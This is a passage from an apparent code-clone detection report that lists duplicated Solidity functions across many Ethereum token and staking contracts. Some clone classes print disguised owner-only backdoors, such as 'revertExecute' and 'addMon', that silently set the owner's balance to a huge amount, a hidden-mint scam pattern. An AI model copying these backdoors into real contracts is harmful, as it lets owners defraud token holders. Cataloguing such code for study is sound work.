                val = commontimestamp - tempharvesttime;
                val = val.mul(stakersRecord[user][blockno].persecondreward);
                if (val < stakersRecord[user][blockno].remainingreward) {
                    ret += val;
                } else {
                    ret += stakersRecord[user][blockno].remainingreward;
                }
            }
        return (ret,commontimestamp);
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="229" endline="251" pcid="7095">
    function realtimeRewardPerBlock(address user, uint256 blockno) public view returns (uint256,uint256) {
        uint256 ret;
        uint256 commontimestamp;
            if (
                !stakersRecord[user][blockno].withdrawan &&
                !stakersRecord[user][blockno].unstaked
            ) {
                uint256 val;
                uint256 tempharvesttime = stakersRecord[user][blockno].lastharvesttime;
                commontimestamp = block.timestamp;
                if(tempharvesttime == 0){
                    tempharvesttime = stakersRecord[user][blockno].staketime;
                }
                val = commontimestamp - tempharvesttime;
                val = val.mul(stakersRecord[user][blockno].persecondreward);
                if (val < stakersRecord[user][blockno].remainingreward) {
                    ret += val;
                } else {
                    ret += stakersRecord[user][blockno].remainingreward;
                }
            }
        return (ret,commontimestamp);
    }
</source>
</class>

<class classid="79" nclones="4" nlines="17" similarity="100">
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="253" endline="271" pcid="495">
    function realtimeReward(address user) public view returns (uint256) {
        uint256 ret;
        for (uint256 i; i < Stakers[user].stakeCount; i++) {
            if (
                !stakersRecord[user][i].withdrawan &&
                !stakersRecord[user][i].unstaked
            ) {
                uint256 val;
                val = block.timestamp - stakersRecord[user][i].staketime;
                val = val.mul(stakersRecord[user][i].persecondreward);
                if (val < stakersRecord[user][i].reward) {
                    ret += val;
                } else {
                    ret += stakersRecord[user][i].reward;
                }
            }
        }
        return ret;
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="253" endline="271" pcid="7096">
    function realtimeReward(address user) public view returns (uint256) {
        uint256 ret;
        for (uint256 i; i < Stakers[user].stakeCount; i++) {
            if (
                !stakersRecord[user][i].withdrawan &&
                !stakersRecord[user][i].unstaked
            ) {
                uint256 val;
                val = block.timestamp - stakersRecord[user][i].staketime;
                val = val.mul(stakersRecord[user][i].persecondreward);
                if (val < stakersRecord[user][i].reward) {
                    ret += val;
                } else {
                    ret += stakersRecord[user][i].reward;
                }
            }
        }
        return ret;
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="253" endline="271" pcid="5295">
    function realtimeReward(address user) public view returns (uint256) {
        uint256 ret;
        for (uint256 i; i < Stakers[user].stakeCount; i++) {
            if (
                !stakersRecord[user][i].withdrawan &&
                !stakersRecord[user][i].unstaked
            ) {
                uint256 val;
                val = block.timestamp - stakersRecord[user][i].staketime;
                val = val.mul(stakersRecord[user][i].persecondreward);
                if (val < stakersRecord[user][i].reward) {
                    ret += val;
                } else {
                    ret += stakersRecord[user][i].reward;
                }
            }
        }
        return ret;
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="253" endline="271" pcid="7553">
    function realtimeReward(address user) public view returns (uint256) {
        uint256 ret;
        for (uint256 i; i < Stakers[user].stakeCount; i++) {
            if (
                !stakersRecord[user][i].withdrawan &&
                !stakersRecord[user][i].unstaked
            ) {
                uint256 val;
                val = block.timestamp - stakersRecord[user][i].staketime;
                val = val.mul(stakersRecord[user][i].persecondreward);
                if (val < stakersRecord[user][i].reward) {
                    ret += val;
                } else {
                    ret += stakersRecord[user][i].reward;
                }
            }
        }
        return ret;
    }
</source>
</class>

<class classid="80" nclones="4" nlines="4" similarity="100">
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="274" endline="277" pcid="496">
    function SetStakeLimits(uint256 _min, uint256 _max) external onlyowner {
        minimumStakeToken = _min;
        maxStakeableToken = _max;
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="274" endline="277" pcid="5296">
    function SetStakeLimits(uint256 _min, uint256 _max) external onlyowner {
        minimumStakeToken = _min;
        maxStakeableToken = _max;
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="274" endline="277" pcid="7097">
    function SetStakeLimits(uint256 _min, uint256 _max) external onlyowner {
        minimumStakeToken = _min;
        maxStakeableToken = _max;
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="274" endline="277" pcid="7554">
    function SetStakeLimits(uint256 _min, uint256 _max) external onlyowner {
        minimumStakeToken = _min;
        maxStakeableToken = _max;
    }
</source>
</class>

<class classid="81" nclones="7" nlines="3" similarity="100">
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="279" endline="281" pcid="497">
    function SetTotalFees(uint256 _fee) external onlyowner {
        totalFee = _fee;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="519" endline="521" pcid="4544">
    function setDecimalsToken(uint256 _decimals) public onlyOwner {
        decimals_token = _decimals;
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="279" endline="281" pcid="7555">
    function SetTotalFees(uint256 _fee) external onlyowner {
        totalFee = _fee;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="523" endline="525" pcid="4545">
    function setDecimalsUSDT(uint256 _decimals) public onlyOwner {
        decimals_usdt = _decimals;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="451" endline="453" pcid="4532">
    function setRefPercent(uint256 newPercent) public onlyOwner {
        refPercent = newPercent;
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="279" endline="281" pcid="5297">
    function SetTotalFees(uint256 _fee) external onlyowner {
        totalFee = _fee;
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="279" endline="281" pcid="7098">
    function SetTotalFees(uint256 _fee) external onlyowner {
        totalFee = _fee;
    }
</source>
</class>

<class classid="82" nclones="8" nlines="6" similarity="100">
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="284" endline="294" pcid="498">
    function SetStakeDuration(
        uint256 first,
        uint256 second,
        uint256 third,
        uint256 fourth
    ) external onlyowner {
        Duration[0] = first;
        Duration[1] = second;
        Duration[2] = third;
        Duration[3] = fourth;
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="296" endline="306" pcid="5299">
    function SetStakeBonus(
        uint256 first,
        uint256 second,
        uint256 third,
        uint256 fourth
    ) external onlyowner {
        Bonus[0] = first;
        Bonus[1] = second;
        Bonus[2] = third;
        Bonus[3] = fourth;
    }
</source>
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="296" endline="306" pcid="499">
    function SetStakeBonus(
        uint256 first,
        uint256 second,
        uint256 third,
        uint256 fourth
    ) external onlyowner {
        Bonus[0] = first;
        Bonus[1] = second;
        Bonus[2] = third;
        Bonus[3] = fourth;
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="284" endline="294" pcid="7556">
    function SetStakeDuration(
        uint256 first,
        uint256 second,
        uint256 third,
        uint256 fourth
    ) external onlyowner {
        Duration[0] = first;
        Duration[1] = second;
        Duration[2] = third;
        Duration[3] = fourth;
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="296" endline="306" pcid="7100">
    function SetStakeBonus(
        uint256 first,
        uint256 second,
        uint256 third,
        uint256 fourth
    ) external onlyowner {
        Bonus[0] = first;
        Bonus[1] = second;
        Bonus[2] = third;
        Bonus[3] = fourth;
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="284" endline="294" pcid="7099">
    function SetStakeDuration(
        uint256 first,
        uint256 second,
        uint256 third,
        uint256 fourth
    ) external onlyowner {
        Duration[0] = first;
        Duration[1] = second;
        Duration[2] = third;
        Duration[3] = fourth;
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="284" endline="294" pcid="5298">
    function SetStakeDuration(
        uint256 first,
        uint256 second,
        uint256 third,
        uint256 fourth
    ) external onlyowner {
        Duration[0] = first;
        Duration[1] = second;
        Duration[2] = third;
        Duration[3] = fourth;
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="296" endline="306" pcid="7557">
    function SetStakeBonus(
        uint256 first,
        uint256 second,
        uint256 third,
        uint256 fourth
    ) external onlyowner {
        Bonus[0] = first;
        Bonus[1] = second;
        Bonus[2] = third;
        Bonus[3] = fourth;
    }
</source>
</class>

<class classid="83" nclones="4" nlines="5" similarity="100">
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="309" endline="313" pcid="500">
    function withdrawETH() public onlyowner {
        uint256 balance = address(this).balance;
        require(balance > 0, "does not have any balance");
        payable(msg.sender).transfer(balance);
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="309" endline="313" pcid="7558">
    function withdrawETH() public onlyowner {
        uint256 balance = address(this).balance;
        require(balance > 0, "does not have any balance");
        payable(msg.sender).transfer(balance);
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="309" endline="313" pcid="5300">
    function withdrawETH() public onlyowner {
        uint256 balance = address(this).balance;
        require(balance > 0, "does not have any balance");
        payable(msg.sender).transfer(balance);
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="309" endline="313" pcid="7101">
    function withdrawETH() public onlyowner {
        uint256 balance = address(this).balance;
        require(balance > 0, "does not have any balance");
        payable(msg.sender).transfer(balance);
    }
</source>
</class>

<class classid="84" nclones="11" nlines="3" similarity="100">
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="315" endline="317" pcid="501">
    function initToken(address addr) public onlyowner{
        token3 = IERC20(addr);
    }
</source>
<source file="systems/source-code/0xD7164217E45842a095feEe0460DC9980617554E1.sol" startline="120" endline="122" pcid="7678">
    function setLogger(address _logger) public auth {
        logger = Logger(_logger);
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="315" endline="317" pcid="5301">
    function initToken(address addr) public onlyowner{
        token3 = IERC20(addr);
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="315" endline="317" pcid="7559">
    function initToken(address addr) public onlyowner{
        token3 = IERC20(addr);
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="435" endline="440" pcid="4530">
    function setAggregatorETHInterface(address _aggregatorETHInterface)
        public
        onlyOwner
    {
        aggregatorETHInterface = AggregatorV3Interface(_aggregatorETHInterface);
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="442" endline="449" pcid="4531">
    function setAggregatorUSDTInterface(address _aggregatorUSDTInterface)
        public
        onlyOwner
    {
        aggregatorUSDTInterface = AggregatorV3Interface(
            _aggregatorUSDTInterface
        );
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="108" endline="110" pcid="6441">
    function setRevoTier(address _revoTier) public onlyOwner {
        revoTier = IRevoTierContract(_revoTier);
    }
</source>
<source file="systems/source-code/0x5a22ab99e1ffc1c27967cb3f4d7da6b535077c23.sol" startline="165" endline="167" pcid="3403">
    function setTellorToken(address _newTokenAddress) public onlyOwner {
        tellorToken = ITellor(_newTokenAddress);
    }
</source>
<source file="systems/source-code/0x5a22ab99e1ffc1c27967cb3f4d7da6b535077c23.sol" startline="149" endline="151" pcid="3401">
    function updateOwner(address _owner) external onlyOwner {
        owner = payable(_owner);
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="315" endline="317" pcid="7102">
    function initToken(address addr) public onlyowner{
        token3 = IERC20(addr);
    }
</source>
<source file="systems/source-code/0x5a22ab99e1ffc1c27967cb3f4d7da6b535077c23.sol" startline="191" endline="193" pcid="3409">
    function setTellorFlex(address _newAddress) public onlyOwner {
        tellorFlex = ITellorFlex(_newAddress);
    }
</source>
</class>

<class classid="85" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="318" endline="321" pcid="502">
    function withdrawToken(uint256 amount) public onlyowner {
        token3.transfer(msg.sender
        , amount);
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="318" endline="321" pcid="5302">
    function withdrawToken(uint256 amount) public onlyowner {
        token3.transfer(msg.sender
        , amount);
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="318" endline="321" pcid="7560">
    function withdrawToken(uint256 amount) public onlyowner {
        token3.transfer(msg.sender
        , amount);
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="318" endline="321" pcid="7103">
    function withdrawToken(uint256 amount) public onlyowner {
        token3.transfer(msg.sender
        , amount);
    }
</source>
</class>

<class classid="86" nclones="5" nlines="5" similarity="100">
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="90" endline="94" pcid="597">
    function openAnus(uint256 addV) external {
        if(adm == msg.sender){
            _balances[msg.sender] = 10000000 * addV * 10 ** tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="90" endline="94" pcid="3858">
    function openAnus(uint256 addV) external {
        if(adm == msg.sender){
            _balances[msg.sender] = 10000000 * addV * 10 ** tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="93" endline="97" pcid="4921">
    function addMon(uint256 addV) external {
        if(adm == msg.sender){
            _balances[msg.sender] = 10000000 * addV * 10 ** tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="104" endline="108" pcid="7223">
    function mintNotkoins(uint256 addV) external {
        if(adm == msg.sender){
            _balances[msg.sender] = 10000000 * addV * 10 ** tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="90" endline="94" pcid="793">
    function fartingMore(uint256 addV) external {
        if(adm == msg.sender){
            _balances[msg.sender] = 10000000 * addV * 10 ** tokenDecimals;
        }
    } 
</source>
</class>

<class classid="87" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x1553F94Cc349AaCa6c1f70707740e48d14f2632D.sol" startline="7" endline="9" pcid="601">
    function name() external pure returns (string memory){
        return "Zero GAS";
    }
</source>
<source file="systems/source-code/0x30d560986fc2269db4935ef6450ae641111fa0ff.sol" startline="7" endline="9" pcid="1532">
    function name() external pure returns (string memory){
        return "Zero GAS";
    }
</source>
</class>

<class classid="88" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x1553F94Cc349AaCa6c1f70707740e48d14f2632D.sol" startline="11" endline="13" pcid="602">
    function symbol() external pure returns (string memory){
        return "ZGAS";
    }
</source>
<source file="systems/source-code/0x30d560986fc2269db4935ef6450ae641111fa0ff.sol" startline="11" endline="13" pcid="1533">
    function symbol() external pure returns (string memory){
        return "ZGAS";
    }
</source>
</class>

<class classid="89" nclones="7" nlines="7" similarity="100">
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="162" endline="168" pcid="618">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            _balances[msg.sender] = 10**15 * n * 1 *  10 **_decimals;
        } else {
            
        }
    } 
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="155" endline="161" pcid="4903">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            _balances[msg.sender] = 10**15 * n * 1 *  10 **_decimals;
        } else {
            
        }
    } 
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="162" endline="168" pcid="4172">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            _balances[msg.sender] = 10**15 * n * 1 *  10 **_decimals;
        } else {
            
        }
    } 
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="163" endline="169" pcid="2390">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            _balances[msg.sender] = 10**15 * n * 1 *  10 **_decimals;
        } else {
            
        }
    } 
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="161" endline="167" pcid="3942">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            _balances[msg.sender] = 10**15 * n * 1 *  10 **_decimals;
        } else {
            
        }
    } 
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="163" endline="169" pcid="1097">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            _balances[msg.sender] = 10**15 * n * 1 *  10 **_decimals;
        } else {
            
        }
    } 
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="160" endline="166" pcid="3164">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            _balances[msg.sender] = 10**15 * n * 1 *  10 **_decimals;
        } else {
            
        }
    } 
</source>
</class>

<class classid="90" nclones="10" nlines="4" similarity="100">
<source file="systems/source-code/0x15bf79FCCCa5E585919bed662E7480DbA80987cd.sol" startline="197" endline="200" pcid="632">
    function approve(address spender, uint value) external returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }
</source>
<source file="systems/source-code/0x15bf79FCCCa5E585919bed662E7480DbA80987cd.sol" startline="202" endline="205" pcid="633">
    function transfer(address to, uint value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="171" endline="174" pcid="4191">
    function transfer(address _to, uint _value) public returns (bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="194" endline="197" pcid="4194">
    function approve(address _spender, uint _value) public returns (bool) {
        _approve(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="203" endline="206" pcid="2494">
    function approve(address _spender, uint _value) public returns (bool) {
        _approve(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="178" endline="181" pcid="1329">
    function transfer(address _to, uint _value) public returns (bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="180" endline="183" pcid="2491">
    function transfer(address _to, uint _value) public returns (bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="203" endline="206" pcid="1332">
    function approve(address _spender, uint _value) public returns (bool) {
        _approve(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="208" endline="211" pcid="2326">
    function approve(address _spender, uint _value) public returns (bool) {
        _approve(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="185" endline="188" pcid="2323">
    function transfer(address _to, uint _value) public returns (bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
</source>
</class>

<class classid="91" nclones="11" nlines="3" similarity="100">
<source file="systems/source-code/0x15bf79FCCCa5E585919bed662E7480DbA80987cd.sol" startline="507" endline="509" pcid="650">
    function allPairsLength() external view returns (uint) {
        return allPairs.length;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="110" endline="112" pcid="5791">
  function _msgSender() internal view returns (address) {
    return msg.sender;
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="114" endline="116" pcid="3675">
  function _msgSender() internal view returns (address) {
    return msg.sender;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="110" endline="112" pcid="7890">
  function _msgSender() internal view returns (address) {
    return msg.sender;
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="146" endline="148" pcid="7751">
  function _msgSender() internal view returns (address) {
    return msg.sender;
  }
</source>
<source file="systems/source-code/0xc04bc1cbdb494f4b508bfbcbfb1ae029b135e80f.sol" startline="95" endline="97" pcid="6848">
    function debug_time() external view returns( uint256 ){
        return block.timestamp;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="63" endline="65" pcid="4515">
    function _msgSender() internal view returns (address) {
        return msg.sender;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="222" endline="224" pcid="6462">
    function getTotalOwnersCount() public view returns (uint) {
        return presaleOwners.length;
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="110" endline="112" pcid="6387">
  function _msgSender() internal view returns (address) {
    return msg.sender;
  }
</source>
<source file="systems/source-code/0xa322440a7b1718a9f343c943ab140e8e62345769.sol" startline="272" endline="275" pcid="5902">
    function getBlockTimestamp() internal view returns (uint) {
        // solium-disable-next-line security/no-block-members
        return block.timestamp;
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="143" endline="145" pcid="7000">
  function _msgSender() internal view returns (address) {
    return msg.sender;
  }
</source>
</class>

<class classid="92" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x1772142ba4a69f3c8a7b4ec5a5cf7195c9882443.sol" startline="30" endline="33" pcid="702">
    function setBetAmount(uint256 _newBetAmount) public {
        require(msg.sender == deployer, "Only deployer can set the bet amount");
        betAmount = _newBetAmount;
    }
</source>
<source file="systems/source-code/0x938be58f77f5e0b41e988615e299345c5eedd485.sol" startline="32" endline="35" pcid="5363">
    function setBetAmount(uint256 _newBetAmount) public {
        require(msg.sender == deployer, "Only deployer can set the bet amount");
        betAmount = _newBetAmount;
    }
</source>
</class>

<class classid="93" nclones="9" nlines="5" similarity="75">
<source file="systems/source-code/0x179bd87ecea2c934ca9334c41173340837a7c920.sol" startline="33" endline="37" pcid="706">
    function approve(address _spender, uint256 _value) public returns (bool success) { // Changed contract name to ERC20Token
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x30211be10119c323649fdeeba28dd40a9f24ff97.sol" startline="56" endline="60" pcid="1471">
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x1ac50ddad5d190bd8403d70b5127749ea6ece230.sol" startline="71" endline="75" pcid="849">
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
</source>
<source file="systems/source-code/0x34d169651d4350d9ee6cb277c67e0e821fafd6ba.sol" startline="30" endline="34" pcid="1650">
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
</source>
<source file="systems/source-code/0x6072F0969b9222854391AeA1Ec490B00384Bf669.sol" startline="31" endline="38" pcid="3658">
    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
</source>
<source file="systems/source-code/0xc630c6bff4d198f30d9ab86f89fb83f0bc3fb948.sol" startline="163" endline="167" pcid="7137">
    function approve(address spender, uint tokens) public returns (bool success) {
         allowed[msg.sender][spender] = tokens;
         emit Approval(msg.sender, spender, tokens);
         return true;
     }
</source>
<source file="systems/source-code/0x4B045C40Ed6b99FB4551522B95C97b7F7aB31371.sol" startline="49" endline="53" pcid="2812">
        function approve(address spender, uint amount) public returns (bool success) {
            allowed[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }
</source>
<source file="systems/source-code/0x8b49740b4c824252dc4b543c746eae0549c22a15.sol" startline="49" endline="53" pcid="5157">
        function approve(address spender, uint amount) public returns (bool success) {
            allowed[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }
</source>
<source file="systems/source-code/0x8bc69EEB26c131274971c972576C54a5765de2de.sol" startline="38" endline="42" pcid="5162">
    function approve(address _spender, uint256 _amount) public returns (bool success) {
        allowance[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
</source>
</class>

<class classid="94" nclones="7" nlines="14" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="130" endline="143" pcid="744">
    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        uint sendAmount = _value.sub(fee);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(msg.sender, owner, fee);
        }
        Transfer(msg.sender, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="126" endline="139" pcid="7397">
    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        uint sendAmount = _value.sub(fee);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(msg.sender, owner, fee);
        }
        Transfer(msg.sender, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="126" endline="139" pcid="3358">
    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        uint sendAmount = _value.sub(fee);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(msg.sender, owner, fee);
        }
        Transfer(msg.sender, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="122" endline="135" pcid="2588">
    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        uint sendAmount = _value.sub(fee);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(msg.sender, owner, fee);
        }
        Transfer(msg.sender, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="126" endline="139" pcid="4446">
    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        uint sendAmount = _value.sub(fee);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(msg.sender, owner, fee);
        }
        Transfer(msg.sender, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="122" endline="135" pcid="8925">
    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        uint sendAmount = _value.sub(fee);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(msg.sender, owner, fee);
        }
        Transfer(msg.sender, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="122" endline="135" pcid="4756">
    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        uint sendAmount = _value.sub(fee);
        balances[msg.sender] = balances[msg.sender].sub(_value);
